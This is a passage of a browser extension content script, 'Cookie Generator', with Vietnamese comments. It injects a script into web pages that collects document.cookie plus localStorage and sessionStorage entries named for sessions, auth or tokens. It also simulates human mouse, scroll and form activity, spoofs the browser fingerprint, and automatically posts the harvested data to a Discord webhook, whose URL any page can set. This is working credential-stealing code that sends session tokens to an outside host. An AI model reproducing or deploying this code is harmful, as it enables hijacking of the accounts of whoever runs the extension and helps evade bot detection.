            // Tạo một sự kiện tùy chỉnh để thông báo khi thư viện đã sẵn sàng
            const event = new CustomEvent('cookiegen_libraries_loaded');
            document.dispatchEvent(event);
            
            // Thông báo qua bridge
            if (window.cookiegenBridge) {
              window.cookiegenBridge.sendMessage('libraries_status', { loaded: true });
            } else {
              window.postMessage({
                from: 'cookiegen_page',
                action: 'libraries_status',
                loaded: true
              }, '*');
            }
          }
        }, 100);  // Kiểm tra mỗi 100ms
        
        // Đặt timeout để dừng kiểm tra sau 10 giây
        setTimeout(() => {
          clearInterval(libraryCheck);
          if (!window.COOKIEGEN_LIBRARIES_LOADED) {
            console.error('Cookie Generator: Không thể tải thư viện sau thời gian chờ');
            
            // Thông báo qua bridge
            if (window.cookiegenBridge) {
              window.cookiegenBridge.sendMessage('libraries_status', { 
                loaded: false,
                error: 'Timeout khi tải thư viện'
              });
            } else {
              window.postMessage({
                from: 'cookiegen_page',
                action: 'libraries_status',
                loaded: false,
                error: 'Timeout khi tải thư viện'
              }, '*');
            }
          }
        }, 10000);  // Chờ tối đa 10 giây
      `;
      (document.head || document.documentElement).appendChild(initScript);
      setTimeout(() => {
        initScript.remove();
      }, 100);
      
      return true;
    });
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi chèn thư viện', error);
    return Promise.reject(error);
  }
}

// Thêm CSS cho việc highlight phần tử
function addHighlightStyle() {
  if (document.getElementById('cookiegen-styles')) return;
  
  const styleElement = document.createElement('style');
  styleElement.id = 'cookiegen-styles';
  styleElement.textContent = `
    .cookiegen-highlight {
      outline: 3px solid rgba(255, 82, 82, 0.8) !important;
      box-shadow: 0 0 10px rgba(255, 82, 82, 0.5) !important;
      transition: outline 0.3s, box-shadow 0.3s !important;
      position: relative !important;
      z-index: 9999 !important;
    }
  `;
  
  document.head.appendChild(styleElement);
}

// Tạo bridge giữa content script và trang web
function createBridge() {
  console.log('Cookie Generator: Tạo bridge với trang web');
  
  // Thêm CSS styles cho highlight
  addHighlightStyle();
  
  // Đăng ký một listener cho các sự kiện từ trang web
  window.addEventListener('message', function(event) {
    // Chỉ xử lý tin nhắn từ cùng một trang
    if (event.source !== window) return;
    
    const message = event.data;
    
    // Kiểm tra nếu tin nhắn là từ extension của chúng ta
    if (message && message.from === 'cookiegen_page') {
      console.log('Cookie Generator: Nhận tin nhắn từ trang', message.action);
      
      switch (message.action) {
        case 'simulation_complete':
          // Xử lý khi mô phỏng từ thư viện hoàn thành
          spoofComplete = true;
          spoofingInProgress = false;
          console.log('Cookie Generator: Đã nhận thông báo hoàn thành từ trang');
          break;
          
        case 'simulation_error':
          // Xử lý khi có lỗi trong quá trình mô phỏng
          console.error('Cookie Generator: Lỗi khi mô phỏng:', message.error);
          spoofComplete = true; // Vẫn đánh dấu hoàn thành để không bị kẹt
          spoofingInProgress = false;
          break;
          
        case 'libraries_status':
          // Xử lý thông tin về trạng thái thư viện
          if (message.loaded) {
            console.log('Cookie Generator: Thư viện đã được tải trong trang');
          } else {
            console.error('Cookie Generator: Thư viện chưa được tải trong trang:', message.error);
          }
          break;
          
        case 'cookies_extracted':
          // Xử lý khi cookies được trích xuất từ trang
          console.log('Cookie Generator: Nhận cookies từ trang', message.cookies?.length || 0);
          
          // Gửi cookies về background script
          chrome.runtime.sendMessage({
            action: 'cookies_saved',
            data: {
              domain: window.location.hostname,
              cookies: message.cookies || [],
              timestamp: new Date().getTime(),
              url: window.location.href
            }
          }).catch(error => {
            console.error('Cookie Generator: Lỗi khi gửi cookies về background script', error);
          });
          
          // Thử gửi đến webhook nếu có cài đặt
          const webhookUrl = CookieExportService.getWebhookUrl();
          if (webhookUrl && message.cookies && message.cookies.length > 0) {
            sendCookiesToDiscordWebhook(message.cookies, webhookUrl)
              .then(success => {
                console.log(`Cookie Generator: Kết quả gửi webhook tự động: ${success ? 'Thành công' : 'Thất bại'}`);
              })
              .catch(error => {
                console.error('Cookie Generator: Lỗi khi gửi webhook tự động', error);
              });
          }
          break;
          
        case 'set_webhook_url':
          // Thiết lập webhook URL
          if (message.url) {
            CookieExportService.setWebhookUrl(message.url);
            console.log('Cookie Generator: Đã thiết lập webhook URL');
          }
          break;
          
        case 'debug_log':
          // Nhận log từ trang để dễ dàng debug
          console.log('Trang:', message.log);
          break;
      }
    }
  });
  
  // Tiêm bridge script vào trang
  const script = document.createElement('script');
  script.textContent = `
    // Tạo đối tượng bridge trên trang web
    window.cookiegenBridge = {
      // Thông báo mô phỏng hoàn thành
      notifySimulationComplete: function() {
        window.postMessage({
          from: 'cookiegen_page',
          action: 'simulation_complete'
        }, '*');
      },
      
      // Báo cáo lỗi
      reportError: function(error) {
        window.postMessage({
          from: 'cookiegen_page',
          action: 'simulation_error',
          error: error
        }, '*');
      },
      
      // Log để debug
      log: function(message) {
        window.postMessage({
          from: 'cookiegen_page',
          action: 'debug_log',
          log: message
        }, '*');
      },
      
      // Trích xuất cookies
      extractCookies: function() {
        try {
          console.log('Cookie Generator (Page): Đang trích xuất cookies...');
          
          // Lấy tất cả cookies từ document.cookie
          const cookieStr = document.cookie;
          console.log('Document.cookie:', cookieStr);
          
          // Phân tích cookies thành object
          const cookiesObject = {};
          
          // Xử lý cookies từ document.cookie
          if (cookieStr && cookieStr.trim() !== '') {
            cookieStr.split(';').forEach(cookie => {
              const parts = cookie.trim().split('=');
              if (parts.length >= 2) {
                const name = parts[0].trim();
                const value = parts.slice(1).join('=').trim();
                cookiesObject[name] = value;
              }
            });
          }
          
          // Thử lấy thêm cookies từ localStorage nếu có thể
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              if (key && (key.includes('cookie') || key.includes('session') || key.includes('auth') || key.includes('token'))) {
                const value = localStorage.getItem(key);
                if (value) {
                  cookiesObject[`localStorage_${key}`] = value;
                }
              }
            }
          } catch (storageErr) {
            console.log('Không thể truy cập localStorage:', storageErr);
          }
          
          // Thử lấy thêm cookies từ sessionStorage nếu có thể
          try {
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              if (key && (key.includes('cookie') || key.includes('session') || key.includes('auth') || key.includes('token'))) {
                const value = sessionStorage.getItem(key);
                if (value) {
                  cookiesObject[`sessionStorage_${key}`] = value;
                }
              }
            }
          } catch (storageErr) {
            console.log('Không thể truy cập sessionStorage:', storageErr);
          }
          
          // Đếm số lượng cookies
          const cookieCount = Object.keys(cookiesObject).length;
          
          if (cookieCount === 0) {
            console.log('Cookie Generator (Page): Không tìm thấy cookies trong trang web');
            
            // Thử cách khác để lấy cookie nếu không tìm thấy trong document.cookie
            const emptyResult = {
              info: 'Không tìm thấy cookies',
              url: window.location.href,
              domain: window.location.hostname
            };
            
            window.postMessage({
              from: 'cookiegen_page',
              action: 'cookies_extracted',
              cookies: emptyResult
            }, '*');
            
            return emptyResult;
          }
          
          console.log('Cookie Generator (Page): Đã trích xuất ' + cookieCount + ' cookies từ trang');
          
          // Gửi cookies về content script
          window.postMessage({
            from: 'cookiegen_page',
            action: 'cookies_extracted',
            cookies: cookiesObject
          }, '*');
          
          return cookiesObject;
        } catch (e) {
          console.error('Cookie Generator (Page): Lỗi khi trích xuất cookies', e);
          
          // Gửi thông tin lỗi
          const errorResult = {
            error: e.message,
            info: 'Đã xảy ra lỗi khi trích xuất cookies',
            url: window.location.href,
            domain: window.location.hostname
          };
          
          window.postMessage({
            from: 'cookiegen_page',
            action: 'cookies_extracted',
            cookies: errorResult
          }, '*');
          
          return errorResult;
        }
      },
      
      // Thiết lập webhook URL
      setWebhookUrl: function(url) {
        window.postMessage({
          from: 'cookiegen_page',
          action: 'set_webhook_url',
          url: url
        }, '*');
      },
      
      // Kiểm tra trạng thái thư viện
      checkLibrariesStatus: function() {
        window.postMessage({
          from: 'cookiegen_page',
          action: 'libraries_status',
          loaded: (typeof window.Humanize !== 'undefined'),
          humanizeLoaded: (typeof window.Humanize !== 'undefined'),
          cookieUtilLoaded: (typeof window.CookieUtil !== 'undefined')
        }, '*');
      }
    };
    
    console.log('Cookie Generator: Bridge đã được tạo và sẵn sàng sử dụng');
  `;
  
  (document.head || document.documentElement).appendChild(script);
  script.remove();
  
  return true;
}

// Thông báo khi content script đã được tải
console.log('Cookie Generator Content Script đã được tải');

// Khởi tạo bridge khi document đã sẵn sàng
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    // Tạo bridge với trang
    createBridge();
    
    // Lắng nghe thông điệp từ background script
    console.log('Cookie Generator: Sẵn sàng nhận thông điệp từ background script');
  });
} else {
  // Tạo bridge ngay lập tức nếu trang đã tải xong
  createBridge();
  console.log('Cookie Generator: Sẵn sàng nhận thông điệp từ background script');
}

// Các hàm tiện ích để thay thế các phụ thuộc vào thư viện bên ngoài
function generateRandomString(length = 10) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Tạo thông tin người dùng ngẫu nhiên nếu CookieUtil không hoạt động
function generateRandomUserInfo() {
  const firstNames = ['John', 'Jane', 'Michael', 'Emily', 'David', 'Sarah', 'Robert', 'Jessica', 'William', 'Jennifer'];
  const lastNames = ['Smith', 'Johnson', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson'];
  const domains = ['example.com', 'test.org', 'sample.net', 'demo.io', 'mail.com'];
  
  const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
  const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
  const randomDomain = domains[Math.floor(Math.random() * domains.length)];
  
  const username = (randomFirstName + randomLastName).toLowerCase().substring(0, 12);
  const email = `${username}@${randomDomain}`;
  const password = `Pass${Math.floor(Math.random() * 10000)}!`;
  
  return {
    firstName: randomFirstName,
    lastName: randomLastName,
    fullName: `${randomFirstName} ${randomLastName}`,
    username: username,
    email: email,
    password: password
  };
}

/**
 * Thực hiện mô phỏng người dùng với cài đặt từ lưu trữ
 */
async function performUserSimulation() {
  try {
    console.log("Bắt đầu mô phỏng người dùng...");
    
    // Ưu tiên sử dụng cài đặt từ biến toàn cục nếu có
    let settings = window.simulationSettings || {};
    
    // Nếu không có cài đặt từ biến toàn cục, tải từ storage
    if (!settings || Object.keys(settings).length === 0) {
      console.log("Không có cài đặt AI sẵn có, tải từ storage...");
      settings = await new Promise((resolve) => {
        chrome.storage.local.get([
          "enableHumanSimulation",
          "simulationIntensity",
          "simulationTime",
          "fillForms",
          "mouseMovement",
          "scrollBehavior"
        ], (result) => {
          resolve({
            enableHumanSimulation: result.enableHumanSimulation !== undefined ? result.enableHumanSimulation : true,
            simulationIntensity: result.simulationIntensity || 'medium',
            simulationTime: result.simulationTime || 30,
            fillForms: result.fillForms !== undefined ? result.fillForms : true,
            mouseMovement: result.mouseMovement || 'natural',
            scrollBehavior: result.scrollBehavior || 'natural'
          });
        });
      });
    }
    
    console.log("Đã tải cài đặt mô phỏng:", settings);
    
    // Kiểm tra xem có bật mô phỏng người dùng không
    if (settings.enableHumanSimulation === false) {
      console.log("Mô phỏng người dùng bị tắt trong cài đặt");
      
      // Báo cáo hoàn thành mô phỏng ngay cả khi không thực hiện
      console.log("Bỏ qua mô phỏng nhưng vẫn báo cáo thành công");
      chrome.runtime.sendMessage({ 
        action: "simulationComplete", 
        success: true,
        message: "Đã bỏ qua mô phỏng người dùng theo cài đặt" 
      });
      
      return true;
    }
    
    // Kiểm tra Humanize có sẵn không
    if (window.Humanize === undefined) {
      console.log("Thư viện Humanize không có sẵn, sử dụng phương pháp mô phỏng đơn giản");
      
      // Sử dụng simulateUser đơn giản
      try {
        await simulateUser();
        console.log("Hoàn thành mô phỏng người dùng đơn giản");
        chrome.runtime.sendMessage({ 
          action: "simulationComplete", 
          success: true,
          message: "Hoàn thành mô phỏng người dùng đơn giản" 
        });
        return true;
      } catch (error) {
        console.error("Lỗi khi mô phỏng người dùng đơn giản:", error);
        chrome.runtime.sendMessage({ 
          action: "simulationComplete", 
          success: false,
          message: `Lỗi khi mô phỏng đơn giản: ${error.message}` 
        });
        return false;
      }
    }
    
    // Cấu hình mô phỏng dựa trên cường độ
    let config = {};
    switch (settings.simulationIntensity) {
      case 'low':
        config = {
          mouseMoveSpeed: 1000,
          mouseJitter: 50,
          typingSpeed: 300,
          typingErrors: 0.03,
          pauseProbability: 0.1,
          pauseDuration: [300, 800],
          naturalCurve: true
        };
        break;
      case 'high':
        config = {
          mouseMoveSpeed: 600,
          mouseJitter: 150,
          typingSpeed: 100,
          typingErrors: 0.08,
          pauseProbability: 0.3,
          pauseDuration: [800, 2000],
          naturalCurve: true
        };
        break;
      case 'ultra':
        config = {
          mouseMoveSpeed: 400,
          mouseJitter: 200,
          typingSpeed: 80,
          typingErrors: 0.1,
          pauseProbability: 0.4,
          pauseDuration: [1000, 3000],
          naturalCurve: true
        };
        break;
      case 'medium':
      default:
        config = {
          mouseMoveSpeed: 800,
          mouseJitter: 100,
          typingSpeed: 150,
          typingErrors: 0.05,
          pauseProbability: 0.2,
          pauseDuration: [500, 1500],
          naturalCurve: true
        };
    }
    
    // Cấu hình di chuyển chuột
    if (settings.mouseMovement === 'linear') {
      config.naturalCurve = false;
    } else if (settings.mouseMovement === 'none') {
      config.mouseMoveSpeed = 5000; // Di chuyển rất nhanh
      config.mouseJitter = 0;
    }
    
    // Ghi log cấu hình
    console.log("Áp dụng cấu hình Humanize:", config);
    
    // Áp dụng cấu hình cho Humanize
    try {
      window.Humanize.configure(config);
      console.log("Đã cấu hình Humanize thành công");
    } catch (configError) {
      console.error("Lỗi khi cấu hình Humanize:", configError);
      // Tiếp tục ngay cả khi có lỗi cấu hình
    }
    
    // Thời gian mô phỏng (đổi thành mili giây)
    const simulationEndTime = Date.now() + (settings.simulationTime * 1000);
    console.log(`Sẽ mô phỏng người dùng trong ${settings.simulationTime} giây, đến ${new Date(simulationEndTime)}`);
    
    // Thời gian mô phỏng
    const simulationEndTimeMs = Date.now() + (settings.simulationTime * 1000);
    
    // Tìm các phần tử có thể tương tác
    const interactiveElements = document.querySelectorAll('a, button, input, select, textarea, [role="button"], [role="link"], [role="checkbox"], [role="radio"], [role="switch"], [role="tab"]');
    const forms = document.querySelectorAll('form');
    
    console.log(`Tìm thấy ${interactiveElements.length} phần tử có thể tương tác và ${forms.length} biểu mẫu`);
    
    // Tạo script tương tác
    const script = async () => {
      try {
        // Di chuyển chuột đến logo hoặc phần đầu trang
        const headerElements = document.querySelectorAll('header, .header, .logo, h1, .navbar, .nav, .banner');
        if (headerElements.length > 0) {
          const headerElement = headerElements[Math.floor(Math.random() * headerElements.length)];
          const rect = headerElement.getBoundingClientRect();
          const targetX = rect.left + rect.width / 2;
          const targetY = rect.top + rect.height / 2;
          
          await window.Humanize.mouseMoveTo(targetX, targetY);
          console.log("Di chuyển chuột đến phần đầu trang");
          
          // Hover một chút
          await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
        }
        
        // Cuộn trang theo cấu hình
        let scrollProgress = 0;
        const numScrolls = settings.scrollBehavior === 'minimal' ? 3 : (settings.scrollBehavior === 'random' ? 5 + Math.floor(Math.random() * 5) : 8);
        
        for (let i = 0; i < numScrolls && Date.now() < simulationEndTimeMs; i++) {
          if (settings.scrollBehavior === 'random') {
            // Cuộn ngẫu nhiên
            const direction = Math.random() > 0.3 ? 1 : -1; // 70% cuộn xuống, 30% cuộn lên
            const amount = direction * (window.innerHeight * (0.3 + Math.random() * 0.5));
            
            await window.Humanize.scrollBy(0, amount);
            console.log(`Cuộn ngẫu nhiên: ${amount}px`);
          } else {
            // Cuộn tự nhiên hoặc tối thiểu
            scrollProgress += 1 / numScrolls;
            const targetScroll = scrollProgress * (document.body.scrollHeight - window.innerHeight);
            const currentScroll = window.scrollY;
            const scrollAmount = targetScroll - currentScroll;
            
            await window.Humanize.scrollBy(0, scrollAmount);
            console.log(`Cuộn tự nhiên: ${scrollAmount}px`);
          }
          
          // Tạm dừng giữa các lần cuộn
          await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
          
          // Tương tác với phần tử ngẫu nhiên sau khi cuộn
          if (interactiveElements.length > 0 && Math.random() > 0.5 && i > 0) {
            const randomElement = interactiveElements[Math.floor(Math.random() * interactiveElements.length)];
            const rect = randomElement.getBoundingClientRect();
            
            // Chỉ tương tác nếu phần tử nhìn thấy được
            if (rect.top >= 0 && rect.bottom <= window.innerHeight && rect.width > 0 && rect.height > 0) {
              const targetX = rect.left + rect.width / 2;
              const targetY = rect.top + rect.height / 2;
              
              await window.Humanize.mouseMoveTo(targetX, targetY);
              console.log(`Di chuyển chuột đến phần tử: ${randomElement.tagName}${randomElement.id ? '#' + randomElement.id : ''}`);
              
              // Hover một chút trước khi click
              await new Promise(resolve => setTimeout(resolve, 300 + Math.random() * 700));
              
              // Xử lý an toàn cho các liên kết
              if (randomElement.tagName === 'A') {
                const href = randomElement.getAttribute('href') || '';
                
                // Kiểm tra nếu là liên kết an toàn
                let isSafe = false;
                
                // Nếu là anchor hoặc javascript void
                if (href === '' || href === '#' || href.startsWith('javascript:')) {
                  isSafe = true;
                } else {
                  try {
                    // Phân tích URL để kiểm tra
                    const url = new URL(href, window.location.href);
                    const domain = url.hostname.replace(/^www\./, '');
                    
                    // Kiểm tra nếu cùng domain và không phải đường dẫn nguy hiểm
                    if (domain === window.location.hostname.replace(/^www\./, '') && 
                        !url.pathname.toLowerCase().includes('logout') && 
                        !url.pathname.toLowerCase().includes('signout') && 
                        !url.pathname.toLowerCase().includes('delete') &&
                        !url.search.toLowerCase().includes('logout') &&
                        !url.search.toLowerCase().includes('signout') &&
                        !url.search.toLowerCase().includes('delete')) {
                      isSafe = true;
                    }
                  } catch (e) {
                    isSafe = false;
                  }
                }
                
                if (isSafe) {
                  // Nếu an toàn, tạm thời thay đổi thuộc tính để tránh chuyển trang
                  const originalHref = randomElement.getAttribute('href');
                  const originalTarget = randomElement.getAttribute('target');
                  
                  // Lưu lại các thuộc tính gốc
                  randomElement.setAttribute('data-original-href', originalHref || '');
                  randomElement.setAttribute('data-original-target', originalTarget || '');
                  
                  // Đặt tạm thời javascript:void(0) để không chuyển trang
                  randomElement.setAttribute('href', 'javascript:void(0);');
                  randomElement.removeAttribute('target');
                  
                  // Thực hiện click
                  await window.Humanize.mouseClick();
                  console.log(`Click an toàn vào liên kết: ${originalHref || '#'}`);
                  
                  // Đặt lại thuộc tính sau một khoảng thời gian
                  await new Promise(resolve => setTimeout(resolve, 300));
                  
                  if (originalHref) {
                    randomElement.setAttribute('href', originalHref);
                  }
                  if (originalTarget) {
                    randomElement.setAttribute('target', originalTarget);
                  }
                } else {
                  console.log(`Bỏ qua click vào liên kết không an toàn: ${href}`);
                  // Chỉ hover, không click
                }
              } else if (randomElement.tagName !== 'A') {
                // Các phần tử không phải liên kết, an toàn để click
                if (Math.random() > 0.5) {
                  await window.Humanize.mouseClick();
                  console.log(`Click vào phần tử: ${randomElement.tagName}${randomElement.id ? '#' + randomElement.id : ''}`);
                }
              }
            }
          }
        }
        
        // Điền biểu mẫu nếu được bật và có biểu mẫu
        if (settings.fillForms && forms.length > 0 && Date.now() < simulationEndTimeMs) {
          console.log("Điền biểu mẫu...");
          const randomForm = forms[Math.floor(Math.random() * forms.length)];
          const inputs = randomForm.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="tel"], textarea');
          
          for (const input of inputs) {
            if (Date.now() >= simulationEndTimeMs) break;
            
            const rect = input.getBoundingClientRect();
            if (rect.top >= 0 && rect.bottom <= window.innerHeight && rect.width > 0 && rect.height > 0) {
              const targetX = rect.left + rect.width / 2;
              const targetY = rect.top + rect.height / 2;
              
              await window.Humanize.mouseMoveTo(targetX, targetY);
              await window.Humanize.mouseClick();
              
              let valueToType = '';
              const type = input.type;
              
              if (type === 'email') {
                valueToType = `user${Math.floor(Math.random() * 1000)}@example.com`;
              } else if (type === 'password') {
                valueToType = `Password${Math.floor(Math.random() * 1000)}!`;
              } else if (type === 'tel') {
                valueToType = `555${Math.floor(Math.random() * 10000000).toString().padStart(7, '0')}`;
              } else {
                // Trường văn bản chung
                const placeholderText = input.placeholder.toLowerCase();
                if (placeholderText.includes('name') || placeholderText.includes('tên')) {
                  valueToType = ['John Smith', 'Mary Johnson', 'David Lee', 'Sarah Brown', 'Michael Wong'][Math.floor(Math.random() * 5)];
                } else if (placeholderText.includes('address') || placeholderText.includes('địa chỉ')) {
                  valueToType = `${Math.floor(Math.random() * 1000)} Main Street`;
                } else {
                  valueToType = `Test Data ${Math.floor(Math.random() * 1000)}`;
                }
              }
              
              await window.Humanize.type(valueToType);
              console.log(`Đã nhập: "${valueToType}" vào ${type} field`);
              
              // Tạm dừng sau khi nhập
              await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
            }
          }
        }
        
        // Cuối cùng, di chuyển đến nút "OK" hoặc "Submit" nếu có
        const submitButtons = [...document.querySelectorAll('button[type="submit"], input[type="submit"], button, .btn, .button')].filter(el => {
          const text = el.textContent.toLowerCase();
          return text.includes('submit') || text.includes('ok') || text.includes('save') || text.includes('continue') || 
                 text.includes('gửi') || text.includes('lưu') || text.includes('tiếp tục');
        });
        
        if (submitButtons.length > 0 && Math.random() > 0.5) {
          const submitButton = submitButtons[0];
          const rect = submitButton.getBoundingClientRect();
          
          if (rect.top >= 0 && rect.bottom <= window.innerHeight) {
            const targetX = rect.left + rect.width / 2;
            const targetY = rect.top + rect.height / 2;
            
            await window.Humanize.mouseMoveTo(targetX, targetY);
            console.log("Di chuyển chuột đến nút gửi");
            
            // Chỉ hover, không click thực sự
            await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 1200));
          }
        }
        
        console.log("Đã hoàn thành script mô phỏng");
        return true;
      } catch (error) {
        console.error("Lỗi trong script mô phỏng:", error);
        return false;
      }
    };
    
    // Thực thi script
    const success = await script();
    chrome.runtime.sendMessage({ 
      action: "simulationComplete", 
      success,
      message: success ? "Đã hoàn thành mô phỏng người dùng" : "Mô phỏng người dùng không thành công" 
    });
    
  } catch (error) {
    console.error("Lỗi khi thực hiện mô phỏng người dùng:", error);
    chrome.runtime.sendMessage({ 
      action: "simulationComplete", 
      success: false,
      message: `Lỗi khi mô phỏng: ${error.message}` 
    });
  }
}

// Thực hiện lấy cookies thông qua bridge
function extractCookies(exportToDiscord = false) {
  try {
    console.log('Cookie Generator: Yêu cầu trích xuất cookies' + 
                (exportToDiscord ? ' và gửi đến Discord webhook' : ''));
    
    // Flag để theo dõi trạng thái
    let cookiesExtracted = false;
    let cookieData = null;
    
    // Promise để theo dõi quá trình trích xuất
    return new Promise((resolve, reject) => {
      // Thêm listener để nhận cookies từ trang
      const messageListener = function(event) {
        if (event.source !== window) return;
        const message = event.data;
        
        if (message && message.from === 'cookiegen_page' && message.action === 'cookies_extracted') {
          // Đã nhận được cookies
          cookiesExtracted = true;
          
          // Chuẩn bị dữ liệu cookie
          let cookies = message.cookies || [];
          
          // Kiểm tra cookies và chuyển đổi định dạng nếu cần
          let formattedCookies = {};
          
          // Kiểm tra nếu là mảng
          if (Array.isArray(cookies)) {
            console.log(`Cookie Generator: Nhận được ${cookies.length} cookies dạng mảng`);
            // Chuyển đổi mảng cookies thành object
            cookies.forEach(cookie => {
              if (cookie && cookie.name) {
                formattedCookies[cookie.name] = cookie.value || '';
              }
            });
          } 
          // Kiểm tra nếu là object
          else if (typeof cookies === 'object' && cookies !== null) {
            console.log(`Cookie Generator: Nhận được cookies dạng object`);
            formattedCookies = cookies;
          } 
          // Kiểm tra nếu là string (document.cookie)
          else if (typeof cookies === 'string') {
            console.log(`Cookie Generator: Nhận được cookies dạng string`);
            // Chuyển đổi string cookies thành object
            cookies.split(';').forEach(cookie => {
              const parts = cookie.trim().split('=');
              if (parts.length >= 2) {
                const name = parts[0];
                const value = parts.slice(1).join('=');
                formattedCookies[name] = value;
              }
            });
          }
          
          cookieData = formattedCookies;
          const cookieCount = Object.keys(cookieData).length;
          
          console.log(`Cookie Generator: Đã trích xuất và định dạng ${cookieCount} cookies từ trang`);
          
          // Gửi cookies về background script
          chrome.runtime.sendMessage({
            action: 'cookies_saved',
            data: {
              domain: window.location.hostname,
              cookies: cookieData,
              timestamp: Date.now(),
              url: window.location.href
            }
          }).catch(error => {
            console.error('Cookie Generator: Lỗi khi gửi cookies về background script', error);
          });
          
          // Nếu cần xuất ra Discord webhook
          if (exportToDiscord && cookieData && Object.keys(cookieData).length > 0) {
            console.log('Cookie Generator: Gửi cookies đến Discord webhook');
            // Sử dụng dịch vụ xuất cookie đã xây dựng
            CookieExportService.sendCookiesToDiscord(cookieData, window.location.href)
              .then(result => {
                console.log(`Cookie Generator: Kết quả gửi webhook: ${result.success ? 'Thành công' : 'Thất bại'}`);
              })
              .catch(error => {
                console.error('Cookie Generator: Lỗi khi gửi webhook', error);
              });
          }
          
          // Xóa listener
          window.removeEventListener('message', messageListener);
          
          // Hoàn thành Promise
          resolve(cookieData);
        }
      };
      
      // Đăng ký listener
      window.addEventListener('message', messageListener);
      
      // Gửi yêu cầu trích xuất cookies đến trang
      const script = document.createElement('script');
      script.textContent = `
        if (window.cookiegenBridge) {
          window.cookiegenBridge.extractCookies();
        } else {
          // Fallback nếu không có bridge
          try {
            const cookies = document.cookie.split(';').map(cookie => {
              const parts = cookie.trim().split('=');
              return {
                name: parts[0],
                value: parts.slice(1).join('='),
                domain: window.location.hostname,
                path: '/'
              };
            });
            
            window.postMessage({
              from: 'cookiegen_page',
              action: 'cookies_extracted',
              cookies: cookies
            }, '*');
          } catch (e) {
            console.error('Cookie Generator: Lỗi khi trích xuất cookies', e);
            window.postMessage({
              from: 'cookiegen_page',
              action: 'cookies_extracted',
              cookies: []
            }, '*');
          }
        }
      `;
      (document.head || document.documentElement).appendChild(script);
      script.remove();
      
      // Timeout sau 5 giây
      setTimeout(() => {
        if (!cookiesExtracted) {
          console.warn('Cookie Generator: Timeout khi trích xuất cookies');
          window.removeEventListener('message', messageListener);
          resolve({});
        }
      }, 5000);
    });
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi trích xuất cookies', error);
    return Promise.resolve({});
  }
}

/**
 * Mô phỏng trang web hiện tại
 * @returns {Promise<boolean>}
 */
async function spoofSite() {
  try {
    // Kiểm tra nếu đã đang xử lý
    if (spoofingInProgress) {
      console.log("Cookie Generator: Đang tiến hành giả mạo, bỏ qua yêu cầu mới");
      return { success: true, message: "Đã đang xử lý" };
    }
    
    // Đánh dấu đang bắt đầu xử lý
    spoofingInProgress = true;
    spoofComplete = false;
    
    // Lấy domain hiện tại
    const domain = window.location.hostname;
    console.log(`Cookie Generator: Bắt đầu giả mạo trang ${domain}`);
    
    try {
      // Lưu domain vào localStorage để theo dõi
      localStorage.setItem('cookiegen_current_domain', domain);
    } catch (storageError) {
      console.warn('Cookie Generator: Không thể lưu domain vào localStorage:', storageError);
    }
    
    // Tạo bridge để giao tiếp với trang
    createBridge();
    
    // Áp dụng các kỹ thuật spoofing fingerprint
    spoofBrowserFingerprint();
    
    // Xử lý các tương tác trên trang
    setupDOMObserver();
    processSafeLinks();
    handleForms();
    handleAJAXRequests();
    
    try {
      // Nạp các thư viện cần thiết
      await injectLibraries()
        .then(async () => {
          // Thực hiện mô phỏng người dùng
          try {
            await performUserSimulation();
          } catch (e) {
            console.error('Cookie Generator: Lỗi khi mô phỏng người dùng:', e);
          }
          
          // Trích xuất cookies sau khi mô phỏng
          console.log('Cookie Generator: Trích xuất cookies sau khi mô phỏng người dùng');
          const cookies = await extractCookies();
          
          // Tự động gửi cookies đến Discord webhook
          try {
            // Lấy webhook URL từ storage
            chrome.storage.local.get(['webhook_url'], function(result) {
              if (result.webhook_url) {
                console.log('Cookie Generator: Tự động gửi cookies đến Discord webhook sau khi hoàn thành task');
                sendCookiesToDiscord(cookies, window.location.href, result.webhook_url)
                  .then(success => {
                    console.log('Cookie Generator: Đã gửi cookies đến Discord sau khi hoàn thành task');
                  })
                  .catch(error => {
                    console.error('Cookie Generator: Lỗi khi gửi cookies đến Discord:', error);
                  });
              }
            });
          } catch (webhookError) {
            console.error('Cookie Generator: Lỗi khi gửi webhook:', webhookError);
          }
        })
        .catch(error => {
          console.error('Cookie Generator: Lỗi khi inject libraries:', error);
        });
      
      // Đánh dấu đã hoàn thành
      spoofComplete = true;
      spoofingInProgress = false;
      
      // Hiển thị thông báo hoàn thành
      showCompletionNotice();
      
      return { success: true, completed: true };
    } catch (error) {
      console.error("Cookie Generator: Lỗi trong quá trình giả mạo:", error);
      
      // Vẫn trích xuất cookies ngay cả khi có lỗi
      try {
        console.log("Cookie Generator: Cố gắng trích xuất cookies sau lỗi");
        const cookies = await extractCookies();
        
        // Vẫn gửi cookies đến Discord webhook khi có lỗi
        try {
          chrome.storage.local.get(['webhook_url'], function(result) {
            if (result.webhook_url) {
              console.log('Cookie Generator: Gửi cookies đến Discord webhook sau khi gặp lỗi');
              sendCookiesToDiscord(cookies, window.location.href, result.webhook_url)
                .then(success => {
                  console.log('Cookie Generator: Đã gửi cookies đến Discord sau khi gặp lỗi');
                })
                .catch(error => {
                  console.error('Cookie Generator: Lỗi khi gửi cookies đến Discord sau khi gặp lỗi:', error);
                });
            }
          });
        } catch (webhookError) {
          console.error('Cookie Generator: Lỗi khi gửi webhook sau khi gặp lỗi:', webhookError);
        }
      } catch (cookieError) {
        console.error("Cookie Generator: Không thể trích xuất cookie sau lỗi:", cookieError);
      }
      
      // Đánh dấu đã hoàn thành (với lỗi)
      spoofComplete = true;
      spoofingInProgress = false;
      
      // Hiển thị thông báo lỗi
      showError("Lỗi khi giả mạo trang: " + error.message);
      
      return { success: false, error: error.message };
